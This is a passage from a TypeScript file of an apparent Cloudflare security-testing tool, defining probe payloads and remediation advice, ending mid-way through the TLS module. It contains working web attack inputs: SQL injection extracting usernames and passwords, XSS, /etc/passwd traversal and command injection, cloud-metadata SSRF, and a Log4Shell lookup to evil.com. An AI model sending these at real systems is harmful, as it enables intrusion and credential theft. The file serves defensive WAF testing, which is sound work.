/**
 * Anga Security \u2014 Attack Payload Definitions
 *
 * 75+ attack payloads across 9 modules. These are SAFE detection-testing payloads
 * designed to trigger WAF rules without causing any damage to the target.
 * They test whether Cloudflare\u2019s protections detect and block known attack patterns.
 */

import type { AttackModuleId, FindingSeverity } from '../../types/simulation';

export interface PayloadDefinition {
  id: string; // e.g. SIM-T001
  module: AttackModuleId;
  name: { es: string; en: string };
  description: { es: string; en: string };
  severity: FindingSeverity;
  /** How to build the HTTP request */
  request: {
    method: string;
    /** Path with payload (may include query string) */
    path: string;
    headers?: Record<string, string>;
    body?: string;
  };
  /** Recommendation if bypassed */
  recommendation: {
    action: { es: string; en: string };
    cf_product: string;
    dashboard_path: string;
    docs_url: string;
    effort: 'quick_fix' | 'moderate' | 'complex';
    roadmap_phase: number;
  };
  /** Expected finding ID if this test is evidence */
  finding_id: string;
}

// ════════════════════════════════════════════════════════════════════
// Module 1: WAF Bypass / OWASP Top 10 (12 tests)
// ════════════════════════════════════════════════════════════════════

const WAF_BYPASS: PayloadDefinition[] = [
  {
    id: 'SIM-T001', module: 'waf_bypass', severity: 'critical',
    name: { es: 'SQLi B\u00e1sico en Query String', en: 'Basic SQLi in Query String' },
    description: { es: 'Inyecci\u00f3n SQL cl\u00e1sica OR 1=1 en par\u00e1metro de URL.', en: 'Classic SQL injection OR 1=1 in URL parameter.' },
    request: { method: 'GET', path: '/search?q=1%27%20OR%201%3D1--' },
    recommendation: { action: { es: 'Habilitar Cloudflare Managed Ruleset y OWASP Core Ruleset.', en: 'Enable Cloudflare Managed Ruleset and OWASP Core Ruleset.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-001',
  },
  {
    id: 'SIM-T002', module: 'waf_bypass', severity: 'critical',
    name: { es: 'SQLi UNION SELECT', en: 'SQLi UNION SELECT' },
    description: { es: 'Inyecci\u00f3n SQL con UNION SELECT para extracci\u00f3n de datos.', en: 'SQL injection with UNION SELECT for data extraction.' },
    request: { method: 'GET', path: '/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--' },
    recommendation: { action: { es: 'Verificar que OWASP Paranoia Level sea PL2 o superior.', en: 'Verify OWASP Paranoia Level is PL2 or higher.' }, cf_product: 'WAF OWASP Core Ruleset', dashboard_path: 'Security > WAF > Managed rules > OWASP', docs_url: '/waf/managed-rules/reference/owasp-core-ruleset/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-002',
  },
  {
    id: 'SIM-T003', module: 'waf_bypass', severity: 'critical',
    name: { es: 'SQLi con URL Encoding Doble', en: 'SQLi with Double URL Encoding' },
    description: { es: 'SQLi usando doble encoding para evadir decodificaci\u00f3n simple.', en: 'SQLi using double encoding to evade single decoding.' },
    request: { method: 'GET', path: '/search?q=%2527%2520OR%25201%253D1--' },
    recommendation: { action: { es: 'Incrementar OWASP Paranoia Level a PL2+ para detectar encoding.', en: 'Increase OWASP Paranoia Level to PL2+ to detect encoding.' }, cf_product: 'WAF OWASP Core Ruleset', dashboard_path: 'Security > WAF > Managed rules > OWASP', docs_url: '/waf/managed-rules/reference/owasp-core-ruleset/concepts/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-002',
  },
  {
    id: 'SIM-T004', module: 'waf_bypass', severity: 'high',
    name: { es: 'XSS Reflejado en Par\u00e1metro', en: 'Reflected XSS in Parameter' },
    description: { es: 'Inyecci\u00f3n de script tag cl\u00e1sico en query string.', en: 'Classic script tag injection in query string.' },
    request: { method: 'GET', path: '/page?name=<script>alert(1)</script>' },
    recommendation: { action: { es: 'Verificar WAF Managed Rules para detecci\u00f3n XSS.', en: 'Verify WAF Managed Rules for XSS detection.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-001',
  },
  {
    id: 'SIM-T005', module: 'waf_bypass', severity: 'high',
    name: { es: 'XSS con Event Handler', en: 'XSS via Event Handler' },
    description: { es: 'XSS usando atributo onerror en tag img.', en: 'XSS using onerror attribute on img tag.' },
    request: { method: 'GET', path: '/page?q=<img%20src=x%20onerror=alert(1)>' },
    recommendation: { action: { es: 'Habilitar WAF Attack Score para detectar variaciones XSS.', en: 'Enable WAF Attack Score to detect XSS variations.' }, cf_product: 'WAF Attack Score', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/detections/attack-score/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-003',
  },
  {
    id: 'SIM-T006', module: 'waf_bypass', severity: 'high',
    name: { es: 'Path Traversal B\u00e1sico', en: 'Basic Path Traversal' },
    description: { es: 'Intento de leer /etc/passwd mediante traversal.', en: 'Attempt to read /etc/passwd via directory traversal.' },
    request: { method: 'GET', path: '/file?name=../../../etc/passwd' },
    recommendation: { action: { es: 'Verificar reglas de path traversal en Managed Rules.', en: 'Verify path traversal rules in Managed Rules.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/reference/cloudflare-managed-ruleset/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-001',
  },
  {
    id: 'SIM-T007', module: 'waf_bypass', severity: 'critical',
    name: { es: 'Inyecci\u00f3n de Comandos OS', en: 'OS Command Injection' },
    description: { es: 'Intento de ejecutar comandos del sistema operativo.', en: 'Attempt to execute operating system commands.' },
    request: { method: 'GET', path: '/ping?host=;cat%20/etc/passwd' },
    recommendation: { action: { es: 'Habilitar WAF Attack Score RCE para detecci\u00f3n de inyecci\u00f3n de comandos.', en: 'Enable WAF Attack Score RCE for command injection detection.' }, cf_product: 'WAF Attack Score', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/detections/attack-score/', effort: 'moderate', roadmap_phase: 2 },
    finding_id: 'SIM-003',
  },
  {
    id: 'SIM-T008', module: 'waf_bypass', severity: 'high',
    name: { es: 'SSRF en Par\u00e1metro URL', en: 'SSRF in URL Parameter' },
    description: { es: 'Intento de acceder a metadatos de nube (169.254.169.254).', en: 'Attempt to access cloud metadata (169.254.169.254).' },
    request: { method: 'GET', path: '/proxy?url=http://169.254.169.254/latest/meta-data/' },
    recommendation: { action: { es: 'Crear regla custom bloqueando IPs internas en par\u00e1metros.', en: 'Create custom rule blocking internal IPs in parameters.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-001',
  },
  {
    id: 'SIM-T009', module: 'waf_bypass', severity: 'high',
    name: { es: 'SQLi en Header Cookie', en: 'SQLi in Cookie Header' },
    description: { es: 'Inyecci\u00f3n SQL dentro de cookie session.', en: 'SQL injection inside session cookie.' },
    request: { method: 'GET', path: '/', headers: { 'Cookie': "session=1' OR '1'='1" } },
    recommendation: { action: { es: 'OWASP PL2+ inspecciona cookies. Verificar paranoia level.', en: 'OWASP PL2+ inspects cookies. Verify paranoia level.' }, cf_product: 'WAF OWASP Core Ruleset', dashboard_path: 'Security > WAF > Managed rules > OWASP', docs_url: '/waf/managed-rules/reference/owasp-core-ruleset/concepts/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-002',
  },
  {
    id: 'SIM-T010', module: 'waf_bypass', severity: 'medium',
    name: { es: 'XSS en Header Referer', en: 'XSS in Referer Header' },
    description: { es: 'Payload XSS en cabecera Referer.', en: 'XSS payload in Referer header.' },
    request: { method: 'GET', path: '/', headers: { 'Referer': 'https://evil.com/<script>alert(1)</script>' } },
    recommendation: { action: { es: 'OWASP PL3+ inspecciona headers. Evaluar incremento.', en: 'OWASP PL3+ inspects headers. Evaluate increase.' }, cf_product: 'WAF OWASP Core Ruleset', dashboard_path: 'Security > WAF > Managed rules > OWASP', docs_url: '/waf/managed-rules/reference/owasp-core-ruleset/concepts/', effort: 'moderate', roadmap_phase: 4 },
    finding_id: 'SIM-002',
  },
  {
    id: 'SIM-T011', module: 'waf_bypass', severity: 'high',
    name: { es: 'SQLi POST Body JSON', en: 'SQLi in POST Body JSON' },
    description: { es: 'Inyecci\u00f3n SQL en cuerpo JSON de petici\u00f3n POST.', en: 'SQL injection in POST request JSON body.' },
    request: { method: 'POST', path: '/api/search', headers: { 'Content-Type': 'application/json' }, body: '{"query":"1\' OR 1=1--","limit":10}' },
    recommendation: { action: { es: 'Verificar que el WAF inspeccione cuerpos JSON.', en: 'Verify WAF inspects JSON bodies.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-001',
  },
  {
    id: 'SIM-T012', module: 'waf_bypass', severity: 'medium',
    name: { es: 'Log4Shell Payload', en: 'Log4Shell Payload' },
    description: { es: 'Payload JNDI lookup de Log4j en User-Agent.', en: 'Log4j JNDI lookup payload in User-Agent.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': '${jndi:ldap://evil.com/a}' } },
    recommendation: { action: { es: 'Cloudflare Managed Ruleset incluye protecci\u00f3n Log4Shell.', en: 'Cloudflare Managed Ruleset includes Log4Shell protection.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/reference/cloudflare-managed-ruleset/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-001',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 2: Rate Limiting (8 tests) — NOTE: these are sequential burst tests
// ════════════════════════════════════════════════════════════════════

const RATE_LIMIT: PayloadDefinition[] = [
  {
    id: 'SIM-T013', module: 'rate_limit', severity: 'high',
    name: { es: 'R\u00e1faga 10 req/s a ra\u00edz', en: '10 req/s burst to root' },
    description: { es: 'Env\u00edo r\u00e1pido de 10 peticiones a / en 1 segundo.', en: 'Rapid send of 10 requests to / in 1 second.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Crear regla de rate limiting para tr\u00e1fico general.', en: 'Create rate limiting rule for general traffic.' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/', effort: 'moderate', roadmap_phase: 5 },
    finding_id: 'SIM-005',
  },
  {
    id: 'SIM-T014', module: 'rate_limit', severity: 'critical',
    name: { es: 'R\u00e1faga 15 req/s a /login', en: '15 req/s burst to /login' },
    description: { es: 'R\u00e1faga contra endpoint de login (fuerza bruta).', en: 'Burst against login endpoint (brute force).' },
    request: { method: 'POST', path: '/login', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=test&password=test' },
    recommendation: { action: { es: 'Crear rate limit espec\u00edfico para /login (5 req/min).', en: 'Create specific rate limit for /login (5 req/min).' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/best-practices/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-005',
  },
  {
    id: 'SIM-T015', module: 'rate_limit', severity: 'high',
    name: { es: 'R\u00e1faga a /api/ endpoints', en: 'Burst to /api/ endpoints' },
    description: { es: 'R\u00e1faga de 10 peticiones a rutas API.', en: 'Burst of 10 requests to API routes.' },
    request: { method: 'GET', path: '/api/users' },
    recommendation: { action: { es: 'Implementar rate limiting por IP para endpoints API.', en: 'Implement per-IP rate limiting for API endpoints.' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/use-cases/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-006',
  },
  {
    id: 'SIM-T016', module: 'rate_limit', severity: 'medium',
    name: { es: 'R\u00e1faga POST a formulario', en: 'POST burst to form' },
    description: { es: 'M\u00faltiples POST a formulario de contacto.', en: 'Multiple POSTs to contact form.' },
    request: { method: 'POST', path: '/contact', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'name=test&email=test@test.com&message=spam' },
    recommendation: { action: { es: 'Agregar rate limiting y Turnstile a formularios.', en: 'Add rate limiting and Turnstile to forms.' }, cf_product: 'Rate Limiting + Turnstile', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/best-practices/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-006',
  },
  {
    id: 'SIM-T017', module: 'rate_limit', severity: 'medium',
    name: { es: 'R\u00e1faga GET a recurso est\u00e1tico', en: 'GET burst to static resource' },
    description: { es: '20 peticiones r\u00e1pidas a un recurso est\u00e1tico.', en: '20 rapid requests to a static resource.' },
    request: { method: 'GET', path: '/favicon.ico' },
    recommendation: { action: { es: 'DDoS HTTP protection deber\u00eda manejar bursts a est\u00e1ticos.', en: 'HTTP DDoS protection should handle static bursts.' }, cf_product: 'HTTP DDoS Protection', dashboard_path: 'Security > DDoS', docs_url: '/ddos-protection/managed-rulesets/http/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-006',
  },
  {
    id: 'SIM-T018', module: 'rate_limit', severity: 'high',
    name: { es: 'R\u00e1faga a /wp-login.php', en: 'Burst to /wp-login.php' },
    description: { es: 'Simulaci\u00f3n de fuerza bruta WordPress.', en: 'WordPress brute force simulation.' },
    request: { method: 'POST', path: '/wp-login.php', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'log=admin&pwd=password123' },
    recommendation: { action: { es: 'Usar "Protect your login" o rate limit custom.', en: 'Use "Protect your login" or custom rate limit.' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/best-practices/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-005',
  },
  {
    id: 'SIM-T019', module: 'rate_limit', severity: 'medium',
    name: { es: 'R\u00e1faga con m\u00faltiples m\u00e9todos', en: 'Burst with multiple methods' },
    description: { es: 'Alternar GET/POST/PUT r\u00e1pidamente.', en: 'Rapidly alternate GET/POST/PUT methods.' },
    request: { method: 'GET', path: '/api/data' },
    recommendation: { action: { es: 'Rate limiting por IP sin importar m\u00e9todo HTTP.', en: 'Rate limiting per IP regardless of HTTP method.' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/parameters/', effort: 'moderate', roadmap_phase: 5 },
    finding_id: 'SIM-006',
  },
  {
    id: 'SIM-T020', module: 'rate_limit', severity: 'low',
    name: { es: 'Detecci\u00f3n de respuesta 429', en: '429 Response Detection' },
    description: { es: 'Verificar que rate limiting devuelve 429 y no solo desaf\u00edo.', en: 'Verify rate limiting returns 429 and not just a challenge.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Configurar acci\u00f3n de rate limiting seg\u00fan caso de uso.', en: 'Configure rate limiting action based on use case.' }, cf_product: 'Rate Limiting Rules', dashboard_path: 'Security > WAF > Rate limiting rules', docs_url: '/waf/rate-limiting-rules/parameters/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-006',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 3: Bot Management Evasion (10 tests)
// ════════════════════════════════════════════════════════════════════

const BOT_EVASION: PayloadDefinition[] = [
  {
    id: 'SIM-T021', module: 'bot_evasion', severity: 'high',
    name: { es: 'User-Agent Vac\u00edo', en: 'Empty User-Agent' },
    description: { es: 'Petici\u00f3n sin cabecera User-Agent.', en: 'Request without User-Agent header.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': '' } },
    recommendation: { action: { es: 'Crear regla custom: (http.user_agent eq "").', en: 'Create custom rule: (http.user_agent eq "").' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/use-cases/challenge-bad-bots/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-008',
  },
  {
    id: 'SIM-T022', module: 'bot_evasion', severity: 'high',
    name: { es: 'Bot Scraper Conocido (python-requests)', en: 'Known Scraper Bot (python-requests)' },
    description: { es: 'User-Agent de python-requests, herramienta com\u00fan de scraping.', en: 'python-requests User-Agent, common scraping tool.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'python-requests/2.28.0' } },
    recommendation: { action: { es: 'Habilitar Super Bot Fight Mode o Bot Management.', en: 'Enable Super Bot Fight Mode or Bot Management.' }, cf_product: 'Bot Management', dashboard_path: 'Security > Bots', docs_url: '/bots/get-started/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-007',
  },
  {
    id: 'SIM-T023', module: 'bot_evasion', severity: 'medium',
    name: { es: 'cURL User-Agent', en: 'cURL User-Agent' },
    description: { es: 'User-Agent de curl, herramienta CLI.', en: 'curl User-Agent, CLI tool.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'curl/7.88.1' } },
    recommendation: { action: { es: 'Evaluar bloqueo de UAs de herramientas CLI.', en: 'Evaluate blocking CLI tool UAs.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 3 },
    finding_id: 'SIM-008',
  },
  {
    id: 'SIM-T024', module: 'bot_evasion', severity: 'high',
    name: { es: 'Headless Chrome Signature', en: 'Headless Chrome Signature' },
    description: { es: 'UA de HeadlessChrome, com\u00fan en automatizaci\u00f3n.', en: 'HeadlessChrome UA, common in automation.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36' } },
    recommendation: { action: { es: 'Bot Management detecta headless via JS Detection.', en: 'Bot Management detects headless via JS Detection.' }, cf_product: 'Bot Management', dashboard_path: 'Security > Bots', docs_url: '/bots/concepts/bot-score/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-007',
  },
  {
    id: 'SIM-T025', module: 'bot_evasion', severity: 'medium',
    name: { es: 'Googlebot Falso', en: 'Fake Googlebot' },
    description: { es: 'Suplantaci\u00f3n de Googlebot User-Agent.', en: 'Spoofed Googlebot User-Agent.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' } },
    recommendation: { action: { es: 'Bot Management verifica bots leg\u00edtimos por IP de origen.', en: 'Bot Management verifies legitimate bots by source IP.' }, cf_product: 'Bot Management', dashboard_path: 'Security > Bots', docs_url: '/bots/concepts/bot-score/', effort: 'moderate', roadmap_phase: 4 },
    finding_id: 'SIM-007',
  },
  {
    id: 'SIM-T026', module: 'bot_evasion', severity: 'medium',
    name: { es: 'Automatizaci\u00f3n sin Accept Headers', en: 'Automation without Accept Headers' },
    description: { es: 'Petici\u00f3n sin Accept ni Accept-Language (no-browser).', en: 'Request without Accept or Accept-Language (non-browser).' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'Mozilla/5.0 Chrome/120' } },
    recommendation: { action: { es: 'Browser Integrity Check detecta cabeceras faltantes.', en: 'Browser Integrity Check detects missing headers.' }, cf_product: 'Browser Integrity Check', dashboard_path: 'Security > Settings', docs_url: '/waf/tools/browser-integrity-check/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-008',
  },
  {
    id: 'SIM-T027', module: 'bot_evasion', severity: 'low',
    name: { es: 'Scrapy Spider UA', en: 'Scrapy Spider UA' },
    description: { es: 'User-Agent de Scrapy, framework de scraping Python.', en: 'Scrapy User-Agent, Python scraping framework.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'Scrapy/2.11' } },
    recommendation: { action: { es: 'Super Bot Fight Mode bloquea scrapers conocidos.', en: 'Super Bot Fight Mode blocks known scrapers.' }, cf_product: 'Super Bot Fight Mode', dashboard_path: 'Security > Bots', docs_url: '/bots/get-started/super-bot-fight-mode/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-007',
  },
  {
    id: 'SIM-T028', module: 'bot_evasion', severity: 'high',
    name: { es: 'Selenium WebDriver Header', en: 'Selenium WebDriver Header' },
    description: { es: 'Cabecera t\u00edpica de Selenium WebDriver.', en: 'Typical Selenium WebDriver header.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'Mozilla/5.0 Chrome/120', 'Sec-Ch-Ua': '"Not_A Brand";v="8"' } },
    recommendation: { action: { es: 'JavaScript Detections identifica WebDriver.', en: 'JavaScript Detections identifies WebDriver.' }, cf_product: 'JavaScript Detections', dashboard_path: 'Security > Bots', docs_url: '/cloudflare-challenges/challenge-types/javascript-detections/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-008',
  },
  {
    id: 'SIM-T029', module: 'bot_evasion', severity: 'medium',
    name: { es: 'HTTP/1.0 Legacy Request', en: 'HTTP/1.0 Legacy Request' },
    description: { es: 'Petici\u00f3n con protocolo anticuado HTTP/1.0.', en: 'Request with legacy HTTP/1.0 protocol.' },
    request: { method: 'GET', path: '/', headers: { 'Connection': 'close' } },
    recommendation: { action: { es: 'Monitorear tr\u00e1fico HTTP/1.0 en Security Analytics.', en: 'Monitor HTTP/1.0 traffic in Security Analytics.' }, cf_product: 'Security Analytics', dashboard_path: 'Security > Analytics', docs_url: '/waf/analytics/security-analytics/', effort: 'moderate', roadmap_phase: 5 },
    finding_id: 'SIM-008',
  },
  {
    id: 'SIM-T030', module: 'bot_evasion', severity: 'info',
    name: { es: 'Verificaci\u00f3n de JS Detection', en: 'JS Detection Verification' },
    description: { es: 'Verificar si el script JSD est\u00e1 inyectado en respuestas HTML.', en: 'Verify if JSD script is injected in HTML responses.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar JavaScript Detections en configuraci\u00f3n de Bots.', en: 'Enable JavaScript Detections in Bots configuration.' }, cf_product: 'JavaScript Detections', dashboard_path: 'Security > Bots', docs_url: '/cloudflare-challenges/challenge-types/javascript-detections/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-008',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 4: Custom Rule Bypass (8 tests - dynamic, defined at runtime)
// ════════════════════════════════════════════════════════════════════

// Custom rule bypass tests are generated dynamically based on Phase 1 intelligence.
// See attacker.ts buildCustomRuleBypassTests()

// ════════════════════════════════════════════════════════════════════
// Module 5: IP/Geo Access Control (6 tests)
// ════════════════════════════════════════════════════════════════════

const IP_GEO: PayloadDefinition[] = [
  {
    id: 'SIM-T039', module: 'ip_geo_access', severity: 'high',
    name: { es: 'Spoofing X-Forwarded-For', en: 'X-Forwarded-For Spoofing' },
    description: { es: 'Inyecci\u00f3n de IP falsa en X-Forwarded-For.', en: 'Injection of fake IP in X-Forwarded-For.' },
    request: { method: 'GET', path: '/', headers: { 'X-Forwarded-For': '1.2.3.4' } },
    recommendation: { action: { es: 'Cloudflare ignora X-Forwarded-For externo. Verificar reglas custom que lo usen.', en: 'Cloudflare ignores external X-Forwarded-For. Check custom rules using it.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-009',
  },
  {
    id: 'SIM-T040', module: 'ip_geo_access', severity: 'high',
    name: { es: 'Spoofing CF-Connecting-IP', en: 'CF-Connecting-IP Spoofing' },
    description: { es: 'Intento de inyectar CF-Connecting-IP (debe ser ignorado).', en: 'Attempt to inject CF-Connecting-IP (should be ignored).' },
    request: { method: 'GET', path: '/', headers: { 'CF-Connecting-IP': '10.0.0.1' } },
    recommendation: { action: { es: 'CF sobreescribe este header. Verificar que el origen solo conf\u00ede en CF.', en: 'CF overwrites this header. Verify origin only trusts CF.' }, cf_product: 'Network Configuration', dashboard_path: 'Network', docs_url: '/fundamentals/concepts/cloudflare-ip-addresses/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-009',
  },
  {
    id: 'SIM-T041', module: 'ip_geo_access', severity: 'medium',
    name: { es: 'X-Real-IP Spoofing', en: 'X-Real-IP Spoofing' },
    description: { es: 'Inyecci\u00f3n de X-Real-IP falso.', en: 'Fake X-Real-IP injection.' },
    request: { method: 'GET', path: '/', headers: { 'X-Real-IP': '192.168.1.1' } },
    recommendation: { action: { es: 'Verificar que el origen no conf\u00ede en X-Real-IP sin validar.', en: 'Verify origin does not trust X-Real-IP without validation.' }, cf_product: 'Transform Rules', dashboard_path: 'Rules > Transform Rules', docs_url: '/rules/transform/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-009',
  },
  {
    id: 'SIM-T042', module: 'ip_geo_access', severity: 'medium',
    name: { es: 'M\u00faltiples IPs en X-Forwarded-For', en: 'Multiple IPs in X-Forwarded-For' },
    description: { es: 'Cadena de IPs para confundir parseo.', en: 'IP chain to confuse parsing.' },
    request: { method: 'GET', path: '/', headers: { 'X-Forwarded-For': '8.8.8.8, 1.1.1.1, 10.0.0.1' } },
    recommendation: { action: { es: 'Usar ip.src de CF (no headers) en reglas de acceso.', en: 'Use CF ip.src (not headers) in access rules.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-009',
  },
  {
    id: 'SIM-T043', module: 'ip_geo_access', severity: 'low',
    name: { es: 'Header True-Client-IP', en: 'True-Client-IP Header' },
    description: { es: 'Inyecci\u00f3n de True-Client-IP (Akamai-style).', en: 'True-Client-IP injection (Akamai-style).' },
    request: { method: 'GET', path: '/', headers: { 'True-Client-IP': '203.0.113.1' } },
    recommendation: { action: { es: 'Header ignorado por CF. Verificar configuraci\u00f3n de origen.', en: 'Header ignored by CF. Verify origin configuration.' }, cf_product: 'Origin Configuration', dashboard_path: 'Network', docs_url: '/fundamentals/concepts/cloudflare-ip-addresses/', effort: 'moderate', roadmap_phase: 5 },
    finding_id: 'SIM-009',
  },
  {
    id: 'SIM-T044', module: 'ip_geo_access', severity: 'info',
    name: { es: 'Verificaci\u00f3n de IP Access Rules', en: 'IP Access Rules Verification' },
    description: { es: 'Verificar que las IP access rules est\u00e9n correctamente configuradas.', en: 'Verify IP access rules are correctly configured.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Revisar IP access rules peri\u00f3dicamente.', en: 'Review IP access rules periodically.' }, cf_product: 'IP Access Rules', dashboard_path: 'Security > WAF > IP Access Rules', docs_url: '/waf/tools/ip-access-rules/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-009',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 6: SSL/TLS Configuration (8 tests)
// ════════════════════════════════════════════════════════════════════

const SSL_TLS: PayloadDefinition[] = [
  {
    id: 'SIM-T045', module: 'ssl_tls', severity: 'high',
    name: { es: 'HTTP sin Redirect', en: 'HTTP without Redirect' },
    description: { es: 'Verificar redirecci\u00f3n HTTP\u2192HTTPS.', en: 'Verify HTTP to HTTPS redirect.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar "Always Use HTTPS".', en: 'Enable "Always Use HTTPS".' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/always-use-https/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-010',
  },
  {
    id: 'SIM-T046', module: 'ssl_tls', severity: 'high',
    name: { es: 'HSTS Header Ausente', en: 'HSTS Header Missing' },
    description: { es: 'Verificar presencia de Strict-Transport-Security.', en: 'Verify Strict-Transport-Security presence.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar HSTS con max-age >= 31536000.', en: 'Enable HSTS with max-age >= 31536000.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/http-strict-transport-security/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-010',
  },
  {
    id: 'SIM-T047', module: 'ssl_tls', severity: 'medium',
    name: { es: 'HSTS sin includeSubDomains', en: 'HSTS without includeSubDomains' },
    description: { es: 'HSTS presente pero sin includeSubDomains.', en: 'HSTS present but without includeSubDomains.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Agregar includeSubDomains a HSTS para protecci\u00f3n completa.', en: 'Add includeSubDomains to HSTS for complete protection.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/http-strict-transport-security/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-010',
  },
  {
    id: 'SIM-T048', module: 'ssl_tls', severity: 'medium',
    name: { es: 'TLS 1.0/1.1 Aceptado', en: 'TLS 1.0/1.1 Accepted' },
    description: { es: 'Verificar versi\u00f3n m\u00ednima TLS (debe ser 1.2+).', en: 'Verify minimum TLS version (should be 1.2+).' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Configurar TLS m\u00ednimo a 1.2.', en: 'Set minimum TLS to 1.2.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/minimum-tls/', effort: 'quick_fix', roadmap_phase: 3 },
    finding_id: 'SIM-011',
  },
  {
    id: 'SIM-T049', module: 'ssl_tls', severity: 'low',
    name: { es: 'TLS 1.3 Deshabilitado', en: 'TLS 1.3 Disabled' },
    description: { es: 'Verificar que TLS 1.3 est\u00e9 habilitado.', en: 'Verify TLS 1.3 is enabled.' },
